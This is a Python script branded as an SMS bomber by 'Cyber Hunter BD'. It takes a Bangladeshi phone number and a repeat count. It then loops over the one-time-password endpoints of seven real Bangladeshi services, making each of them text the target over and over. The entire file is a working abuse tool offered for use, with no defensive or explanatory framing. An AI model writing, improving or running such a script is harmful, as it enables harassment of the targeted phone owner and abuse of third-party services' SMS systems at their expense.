import sys,os,time
import requests
from requests.structures import CaseInsensitiveDict

blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
black="\033[0;30m"
pink="\x1b[95m"
blue="\x1b[94m"
underline='\x1b[4m'
colouroff="\x1b[00m"
os.system('clear')
r=requests.get('https://pastebin.com/raw/Ga6ej4mA').text
r1=str(r)
logu=(pink+f"""
\t  ____      _   _      ____
\t / ___|    | | | |    | __ )
\t| |        | |_| |    |  _ \    """+colouroff+underline+"""CYBER HUNTER BD"""+colouroff+pink+"""
\t| |___     |  _  |    | |_) |
\t \____|    |_| |_|    |____/ 
\n"""+blue+"""           Focous on Your Aim, You Will winner""")


line=end+"\n__________________________________________________________"
def ccc():
	print(logu+"\n\n	"+green+"   Developed By : PSycho"+green+"\n\n 	"+red+"   Version :"+r1+"\n\n            "+line)

ccc()

number=str(input(red+"\n\n\n[➙] Enter Your Number [>]+880"))
amount=int(input(cyan+"[➙] Enter The Amount [>]"))

url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone=0"+number






url2 = "https://stage.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"

url3 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"

data3 = '{\"mobile\":\"0'+number+'\"}'

url4 = "https://addabaji.mobi/twocups-v1-robi/otp.php"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/x-www-form-urlencoded"

data4 = "msisdn=0"+number

url5 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/json"

data5 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
url = "https://api-v4-1.hungrynaki.com/graphql"

data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}






url9 = "https://lms.10minuteschool.com/api/v4/auth/sendOtp"

headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"

data9 = '{"phone":{"number":"'+number+'","internationalNumber":"+880 '+number+'","nationalNumber":"'+number+'","e164Number":"+880'+number+'","countryCode":"BD","dialCode":"+880"},"contact":"+880'+number+'","type":"phone"}'



for i in range (amount):
	resp = requests.post(url, json=data)
	resp9 = requests.post(url9, headers=headers9, data=data9)
	resp1 = requests.post(url1, headers=headers1, data=data1)
	resp3 = requests.get(url2)
	resp4 = requests.post(url3, headers=headers3,data=data3)
	resp5 = requests.post(url4, headers=headers4, data=data4)
	resp6 = requests.post(url5, headers=headers5, data=data5)


print(green+'\n\n ➙Success Sms  Sand ⏳⌛')
time.sleep(5)


print(cyan+'\t\tThanks For Using CHB  SMS BOMBER  ')
a=input()
os.system("Clear")
